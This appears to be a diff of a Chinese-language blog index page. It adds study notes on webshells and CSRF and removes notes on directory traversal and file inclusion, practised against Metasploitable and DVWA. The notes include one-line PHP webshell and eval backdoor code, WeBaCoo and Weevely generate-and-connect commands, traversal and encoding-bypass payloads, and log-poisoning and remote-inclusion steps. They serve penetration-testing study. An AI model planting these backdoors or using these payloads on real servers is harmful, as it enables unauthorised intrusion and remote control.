@@ -240,6 +240,496 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/" itemprop="url">Kali Linux笔记(五十四)：WebShell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
+                2020-01-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-WEBSHELL–浏览器"><a href="#1-WEBSHELL–浏览器" class="headerlink" title="1. WEBSHELL–浏览器"></a>1. WEBSHELL–浏览器</h4><ul>
+<li>Shell<ul>
+<li>ssh登陆到metasploitable</li>
+<li><strong><code>🔺命令：vi a.php</code></strong></li>
+<li><?php echo shell_exec($_GET['cmd']);?></li>
+<li><strong><code>🔺命令：cp a.php /var/www</code></strong></li>
+<li>浏览器访问a.php</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用"><a href="#2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用" class="headerlink" title="2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用"></a>2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用</h4><ul>
+<li>中国菜刀：<a href="http://www.maicaidao.co/（使用unicode编码）" target="_blank" rel="noopener">http://www.maicaidao.co/（使用unicode编码）</a><ul>
+<li>将代码新建到靶机上caidao.php</li>
+<li><?php @eval(_POST['chopper']);?></li>
+<li><strong><code>🔺命令：cp caidao.php /var/www</code></strong></li>
+<li>菜刀服务端添加caidao.php的URL，进行配置，输入密码，执行</li>
+</ul>
+</li>
+<li>WebShell可能被IDS、AV、WAF、扫描器软件发现查杀</li>
+</ul>
+<h4 id="3-WEBSHELL–WeBaCoo（PHP）"><a href="#3-WEBSHELL–WeBaCoo（PHP）" class="headerlink" title="3. WEBSHELL–WeBaCoo（PHP）"></a>3. WEBSHELL–WeBaCoo（PHP）</h4><ul>
+<li>WeBaCoo（Web Backdoor Cookie）<ul>
+<li>类终端的shell</li>
+<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
+<li>cm：base64编码的命令</li>
+<li>cn：服务器用于数据的cookie头的名（默认值）</li>
+<li>cp：返回信息定界符（变化的定界符）</li>
+<li>生成服务端</li>
+</ul>
+</li>
+<li>生成服务端<ul>
+<li><strong><code>🔺命令：webacoo -g -o webacoo.php</code></strong></li>
+</ul>
+</li>
+<li>拷贝webacoo.php到服务器端<ul>
+<li><strong><code>🔺命令：scp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
+<li>ssh登陆到metasploitable</li>
+<li><strong><code>🔺命令：cp webacoo.php /var/www</code></strong></li>
+</ul>
+</li>
+<li>客户端连接<ul>
+<li><strong><code>🔺命令：webacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
+</ul>
+</li>
+<li>连接成功会出现命令提示符</li>
+<li>抓包查看cookie</li>
+<li>其他参数<ul>
+<li>-g 生成服务器端代码</li>
+<li>-f 添加执行php操作系统函数</li>
+<li>-r 返回不进行混淆的代码</li>
+<li>-t 远程建立terminal</li>
+<li>-u webacoo URL</li>
+<li>-e 单命令执行模式</li>
+<li>-m HTTP通信方式（默认为Get）</li>
+<li>-c 指定Cookie名字</li>
+<li>-d 定界符</li>
+<li>-a HTTP的user-agent</li>
+<li>-p 代理服务</li>
+<li>-l 记录日志</li>
+<li>update 升级版本</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-WEBSHELL–Weevely（PHP）"><a href="#4-WEBSHELL–Weevely（PHP）" class="headerlink" title="4. WEBSHELL–Weevely（PHP）"></a>4. WEBSHELL–Weevely（PHP）</h4><ul>
+<li>隐藏的类终端PHP Webshell</li>
+<li>30多个管理模块<ul>
+<li>执行系统命令、测试文件系统</li>
+<li>检查服务器常见配置错误</li>
+<li>创建正向、反向TCP Shell连接</li>
+<li>通过目标计算机代理HTTP流量</li>
+<li>从目标计算机运行端口扫描，渗透内网</li>
+</ul>
+</li>
+<li>支持连接密码</li>
+<li>Kali缺少库 ▲ 2020.1.21已支持该库<ul>
+<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
+<li><strong><code>🔺命令：./setup.py install</code></strong></li>
+</ul>
+</li>
+<li>生成服务端<ul>
+<li><strong><code>🔺命令：weevely generate &lt;password&gt; wee.php</code></strong> ▲ 2020.1.21生成程序在终端所在位置</li>
+<li>/usr/share/weevely/wee.php</li>
+</ul>
+</li>
+<li>拷贝wee.php到服务器端<ul>
+<li><strong><code>🔺命令：scp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
+<li><strong><code>🔺命令：cp wee.php /var/www</code></strong></li>
+</ul>
+</li>
+<li>客户端连接服务器<ul>
+<li><strong><code>🔺命令：weevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
+</ul>
+</li>
+<li>抓包查看HTTP头（过滤：tcp.stream eq 5）</li>
+<li>▲ 通过Referer、Cookie、body进行传输，解码可用Base64解码</li>
+<li>help（查看模块）<ul>
+<li>audit_sgidsgid（SUID+SGID）</li>
+<li>audit_filesystem（查找文件设置权限）</li>
+<li>audit_phpconf（审计php的配置信息）</li>
+<li>system_info（操作系统配置）</li>
+<li>backdoor_tcp（本地监听一个shell在TCP端口上）</li>
+<li>backdoor_reversetcp（本地监听反弹一个shell）</li>
+<li>bruteforce_sql（SQL注入的暴力破解）</li>
+<li>net_proxy（把靶机变成代理服务器，但代理IP端口都设置在攻击者上）</li>
+<li>net_phpproxy（php代理，需要安装一个php代理在靶机上）</li>
+<li>net_scan IP:端口（把靶机作为扫描器）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/" itemprop="url">Kali Linux笔记(五十三)：CSRF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
+                2020-01-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
+<li>Cross-site request forgery</li>
+<li>与XSS经常混淆</li>
+<li>从信任的角度来区分<ul>
+<li>XSS：利用用户对站点的信任</li>
+<li>CSRF：利用站点对已经身份认证的信任</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐CSRF过程
+1.客户端向服务器发送请求，获得身份认证Token
+2.Hacker向客户端发送一个伪造定制页面，诱使客户端点击页面
+3.客户端点击页面，页面通过客户端的Token提交数据指令给服务器端
+4.服务器端未进行对请求来源的验证，只验证Session是否合法性
+▲ 二次认证，随机数机制，验证码机制一定程度上可以防控CSRF漏洞</code></pre></blockquote>
+<ul>
+<li>结合社工在身份认证会话过程中实现攻击<ul>
+<li>修改账号密码、个人信息（email、收获地址）</li>
+<li>发送伪造的业务请求（网银、购物、投票）</li>
+<li>关注他人社交账号，推送博文</li>
+<li>▲ 在用户非自愿、不知情的情况下提交请求</li>
+</ul>
+</li>
+<li>业务逻辑漏洞<ul>
+<li>对关键操作缺少确认机制</li>
+<li>自动扫描程序无法发现此类漏洞</li>
+</ul>
+</li>
+<li>漏洞利用条件<ul>
+<li>被害用户已经完成身份认证</li>
+<li>新请求的提交不需要重新身份认证或确认机制</li>
+<li>攻击者必须了解Web Application请求的参数构造</li>
+<li>诱使用户触发攻击的指令（社工）</li>
+</ul>
+</li>
+<li>▲ 自动扫描程序的检测方法<ul>
+<li>在请求和响应过程中检查是否存在anti-CSRF token名（随机数验证）</li>
+<li>检查服务器是否验证anti-CSRF token的名值（服务器端是否验证token正确性）</li>
+<li>检查token中是否可编辑的字符串</li>
+<li>检查referer头是否可以伪造</li>
+</ul>
+</li>
+<li>对策<ul>
+<li>Captcha（验证码机制）</li>
+<li>anti-CSRF token（使用最广）</li>
+<li>Referer头</li>
+<li>降低会话超时时间</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-CSRF–漏洞利用方法"><a href="#2-CSRF–漏洞利用方法" class="headerlink" title="2. CSRF–漏洞利用方法"></a>2. CSRF–漏洞利用方法</h4><ul>
+<li>CSRF → Get方法<ul>
+<li>Kali开启apach服务</li>
+<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-get.html</code></strong></li>
+<li><code>&lt;a href=&quot;Burpsuit抓取的地址/URL地址抓取&quot;&gt;csrf&lt;/a&gt;</code></li>
+<li>window上访问csrf-get.html</li>
+</ul>
+</li>
+<li>CSRF → Post方法<ul>
+<li>View Source查看页面的源代码</li>
+<li>保存表单form的内容存成一个页面，csrf-post.html</li>
+<li>诱使用户点击</li>
+</ul>
+</li>
+<li>Burpsuit → 右键请求 → Engagement tools → Generate CSRF Poc ▲ 2020.1.21只有Burpsuite Professional版本才有此功能<ul>
+<li>Burpsuit自动生成CSRF生成的一个页面</li>
+<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-post-burp.html</code></strong></li>
+<li>window上访问csrf-post-burp.html</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-CSRF–DVWA"><a href="#3-CSRF–DVWA" class="headerlink" title="3. CSRF–DVWA"></a>3. CSRF–DVWA</h4><ul>
+<li>Dvwa中的CSRF（Low）<ul>
+<li>多种绕过方式</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">                </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa中的CSRF（Medium）<ul>
+<li>eregi()函数，取HTTP_REFERER进行比较判断</li>
+<li>绕过方法：Burpsuite抓包截断进行修改HTTP头的Referer参数</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Checks the http referer header</span><br><span class="line">        if ( eregi ( &quot;127.0.0.1&quot;, $_SERVER[&apos;HTTP_REFERER&apos;] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            // Turn requests into variables</span><br><span class="line">            $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">            $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">            if ($pass_new == $pass_conf)&#123;</span><br><span class="line">                $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">                $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">                $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">                $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">                mysql_close();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            else&#123;        </span><br><span class="line">                echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa中的CSRF（High）<ul>
+<li>表单加入当前密码认证（二次认证）</li>
+<li>基本无绕过方式</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_curr = $_GET[&apos;password_current&apos;];</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">        // Sanitise current password input</span><br><span class="line">        $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">        $pass_curr = mysql_real_escape_string( $pass_curr );</span><br><span class="line">        $pass_curr = md5( $pass_curr );</span><br><span class="line">        </span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $qry = &quot;SELECT password FROM `users` WHERE user=&apos;admin&apos; AND password=&apos;$pass_curr&apos;;&quot;;</span><br><span class="line">        $result = mysql_query($qry) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf) &amp;&amp; ( $result &amp;&amp; mysql_num_rows( $result ) == 1 ))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/20/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2590,789 +3080,11 @@ Host：123
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url">Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-手动漏洞挖掘–目录遍历-文件包含"><a href="#1-手动漏洞挖掘–目录遍历-文件包含" class="headerlink" title="1. 手动漏洞挖掘–目录遍历/文件包含"></a>1. 手动漏洞挖掘–目录遍历/文件包含</h4><ul>
-<li>Directory traversal/File include（有区别/没区别）<ul>
-<li>目录权限限制不严/文件包含</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐区别:
-目录遍历：操作系统内部文件
-文件包含：1.LFI包含本地文件include 
-         2.RFI远程文件包含include（php的include函数）
-▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
-<ul>
-<li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
-<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
-<li>allow_url_include=On</li>
-<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
-</ul>
-</li>
-<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
-<li>读、写文件、远程执行代码</li>
-</ul>
-</li>
-<li>特征但不绝对<ul>
-<li>?page=a.php</li>
-<li>?home=b.html</li>
-<li>?file=content</li>
-</ul>
-</li>
-<li>经典测试方法<ul>
-<li>?file=../../../../../../../../etc/passwd</li>
-<li>?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）</li>
-<li>?home=main.cgi</li>
-<li>?page=<a href="http://www.a.com/1.php（远程文件包含）" target="_blank" rel="noopener">http://www.a.com/1.php（远程文件包含）</a></li>
-<li><a href="http://1.1.1.1/../../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../../dir/file.txt</a></li>
-</ul>
-</li>
-<li>编码绕过字符过滤<ul>
-<li>“.” “%00”–空字符（绕过文件扩展名过滤）</li>
-<li>?file=a.doc%00.php</li>
-<li>使用多种编码尝试</li>
-</ul>
-</li>
-<li>不同操作系统的路径特征字符<ul>
-<li>类Unix系统（根目录:/  目录层级分隔符:/）</li>
-<li>Windows系统（C:/  \或/）</li>
-</ul>
-</li>
-<li>URL编码、双层URL编码<ul>
-<li>%2e%2e%2f        解码：../</li>
-<li>%2e%2e%5c        解码：..\</li>
-<li>%252e%252e%255c  解码：..\（双层编码，%25解码后为%）</li>
-</ul>
-</li>
-<li>Unicode/UTF-8编码<ul>
-<li>..%c0%af         解码：../</li>
-<li>..%u2216</li>
-<li>..%c1%9c         解码：..\</li>
-</ul>
-</li>
-<li>其他系统路径可能使用到的字符<ul>
-<li>file.txt…</li>
-<li>file.txt<spaces></li>
-<li>file.txt````````</li>
-<li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;</li>
-<li>./././file.txt</li>
-<li>nonexistant/../file.txt（不存在的目录）</li>
-</ul>
-</li>
-<li>UNC路径（文件共享路径）<ul>
-<li>\1.1.1.1\path\to\file.txt</li>
-</ul>
-</li>
-<li>本地文件抱哈LFI（一般很难代码执行）<ul>
-<li>查看文件</li>
-<li>代码执行</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐LFI的代码执行
-1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
-3.查看access.log文件www-data用户是否可以进行执行修改
-4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
-5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
-6.ls -ld查看权限，保证上级上上级可被www-data执行
-7.?page=/var/log/apache2/access.log（LFI本地文件包含）</code></pre></blockquote>
-<ul>
-<li>远程文件执行RFI<ul>
-<li>出现概率少于LFI，但更容易被利用</li>
-<li>测试 </li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐测试远程文件包含
-1.kali本地侦听80端口（本机端口）
-2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
-3.若kali收到请求，则表示测试成功
-⭐远程文件包含
-1.Kali机子上vi 1.txt
-2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-3.Kali机子上service apache2 start（存放在/var/www/html/）
-4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
-<ul>
-<li>DVWA的File Inclusion（low）</li>
-<li>多种绕过方法</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（mediaum）</li>
-<li>绕过方法:ht<a href="http://tp://dvwa/" target="_blank" rel="noopener">http://tp://dvwa/</a>….</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    $file = str_replace(&quot;http://&quot;,&quot;&quot;,$file);</span><br><span class="line">    $file = str_replace(&quot;https://&quot;,&quot;&quot;,$file);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（high）</li>
-<li>暂无绕过方法</li>
-</ul>
